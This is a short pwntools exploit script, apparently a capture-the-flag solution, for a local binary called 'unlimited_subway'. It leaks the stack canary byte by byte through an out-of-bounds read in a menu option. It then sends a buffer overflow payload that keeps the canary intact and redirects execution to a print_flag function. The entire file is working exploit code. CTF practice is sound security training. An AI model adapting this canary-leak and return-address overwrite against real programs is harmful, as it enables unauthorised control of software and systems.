from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

ru          = lambda a:         p.readuntil(a)
r           = lambda n:         p.read(n)
sla         = lambda a,b:       p.sendlineafter(a,b)
sa          = lambda a,b:       p.sendafter(a,b)
sl          = lambda a:         p.sendline(a)
s           = lambda a:         p.send(a)

p = process('./unlimited_subway')
e = ELF('./unlimited_subway')
# l = e.libc

canary = b''
print_flag = e.symbols['print_flag']
log.info("print_flag : 0x%08x" % print_flag)

# gdb.attach(p,'''b *main+554''')
# gdb.attach(p,'''b *main+609''')
# gdb.attach(p)

for i in range(0x83, 0x7f, -1):
    sla('> ', 'V')
    sla(' : ', bytes(str(i), 'utf-8'))
    ru(' : ')
    canary += r(2)

canary = int(canary, 16)
log.info("canary : 0x%08x" % canary)

payload = b''
payload += b'A'*0x40
payload += p32(canary)
payload += b'B'*0x4
payload += p32(print_flag)

sla('>', 'E')
sla(" : ", bytes(str(len(payload)), 'utf-8'))
sla(" : ", payload)

p.interactive()
